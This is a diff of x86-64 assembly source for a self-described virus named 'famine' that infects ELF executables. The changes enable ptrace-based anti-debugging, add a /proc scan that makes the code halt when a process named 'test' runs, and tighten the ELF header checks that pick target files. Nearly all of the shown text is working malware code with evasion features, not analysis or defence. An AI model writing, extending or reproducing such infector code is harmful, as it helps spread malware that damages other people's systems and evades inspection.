@@ -13,25 +13,25 @@ _famine:
     PUSH
     mov rbp, rsp
     sub rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
-;ANTI DEBUG
-    ; mov rdi, 0
-    ; mov rsi, 0
-    ; mov rdx, 1
-    ; mov r10, 0
-    ; mov rax, SYS_PTRACE
-    ; syscall
-    ; cmp rax, 0
-    ; jge anti_process
-    ; mov rax, qword 0x4e49474755424544
-    ; mov [rsp], rax
-    ; mov rax, 0x0a2e2e47
-    ; mov [rsp + 8], rax
-    ; mov rdi, 1
-    ; lea rsi, [rsp]
-    ; mov rdx, 13
-    ; mov rax, SYS_WRITE
-    ; syscall
-    ; jmp clean
+; ANTI DEBUG
+    mov rdi, 0
+    mov rsi, 0
+    mov rdx, 1
+    mov r10, 0
+    mov rax, SYS_PTRACE
+    syscall
+    cmp rax, 0
+    jge anti_process
+    mov rax, qword 0x4e49474755424544
+    mov [rsp], rax
+    mov rax, 0x0a2e2e47
+    mov [rsp + 8], rax
+    mov rdi, 1
+    lea rsi, [rsp]
+    mov rdx, 13
+    mov rax, SYS_WRITE
+    syscall
+    jmp clean
 
 anti_process:
 ; open /proc/
@@ -64,14 +64,20 @@ anti_process:
     syscall
     cmp rax, 0
     jl clean_anti_process
+; [RSP] 0 => 32 = TARGET PATH
+; [RSP + 32] = MAPPED
+; [RSP + 40] = BOOLEAN PROCESS FOUND
+; [RSP + 42] = BUFFER READ
+; [RSP + 64]
 ; filter process
     mov rcx, rax
     mov rdx, [rsp + 32]
-    mov qword [rsp + 64], rdx
     xor r15, r15
     .search_pid:
         cmp rcx, r15
         je  clean_anti_process
+        mov [rsp + 72], rdx
+        mov [rsp + 80], rcx
         cmp byte [rdx + LDIRENT_64.d_type], 0x4
         jne .inc
         cmp byte [rdx + LDIRENT_64.d_name], 0x30
@@ -81,40 +87,59 @@ anti_process:
 
     mov rax, [rdx + LDIRENT_64.d_name]
     mov [rsp + 6], rax
-    xor rax, rax
-
+    xor rax, rax                                    ; OFFSET
+; concat /proc/<name>
     .concat:
         cmp byte [rsp + 7 + rax], 0
         je .read_proc
         add rax, 1
         jmp .concat
-        
-        ;63 6d 64 6c 69 6e 65
+
     .read_proc:
         mov rdx, 0x656e696c646d632f
         mov [rsp + 7 + rax], rdx
         lea rdi, [rsp]
         mov rsi, 0x0
+        mov rdx, 0
         mov rax, SYS_OPEN
         syscall
         cmp rax, 0
         jl .inc
+        mov r8, rax
         mov rdi, rax
-        mov rsi, [rsp + 42]
-        mov rdx, 0x5
+        lea rsi, [rsp + 42]
+        mov rdx, 30           ; read 1024
         mov rax, SYS_READ
         syscall
+        cmp rax, 5
+        jl .cleanup_fd
         mov rcx, 5
-        mov rdi, [rsp + 42]
-        mov rax, 0x0074736574
-        mov [rsp + 48], rax
-
+        lea rdi, [rsp + 42]
+        sub rax, 6  
+        add rdi, rax
+        mov rax, 0x00747365742f
+        mov [rsp + 24], rax
+        lea rsi, [rsp + 24]
+        cld
+        repe cmpsb
+        je proc_found
+    .cleanup_fd:
+        mov rdi, r8
+        mov rax, SYS_CLOSE
+        syscall
     .inc:
-        mov rdx, qword [rsp + 64]
+        mov rdx, [rsp + 72]
+        mov rcx, [rsp + 80]
         movzx rax, word [rdx + LDIRENT_64.d_reclen]
         add r15, rax
         add rdx, rax
         jmp .search_pid
+
+proc_found:
+    mov rdi, r8
+    mov rax, SYS_CLOSE
+    syscall
+    mov [rsp + 40], word 1
 
 clean_anti_process:
     mov rdi, r14
@@ -124,9 +149,11 @@ clean_anti_process:
     mov rsi, 0x10000
     mov rax, SYS_MUNMAP
     syscall
-    mov rax, [rsp + 40]
-    cmp rax, 0
+    mov ax, word [rsp + 40]
+    cmp ax, 0
     jne clean
+    mov rcx, 128
+    memset [rsp], rcx
     ; need ro clean stack aswell.
 
 launch:
@@ -241,7 +268,7 @@ elf_header:
     jne clear
     .exec:
         cmp word [rsi + Elf64_Ehdr.e_type], ET_EXEC        
-        je .machine
+        jne clear
     .machine:
         cmp word [rsi + Elf64_Ehdr.e_machine], 62
         je elf_sign
@@ -420,10 +447,6 @@ _v_stop:                                                   ; End of virus
     mov rax, SYS_EXIT 
     mov rdi, 0
     syscall
-
-    ; mov rsi, [rbp - 16]
-    ; mov rax, qword [rsi + Elf64_Ehdr.e_entry]
-    ; jmp rax
 
 hook:
     .folder_1:
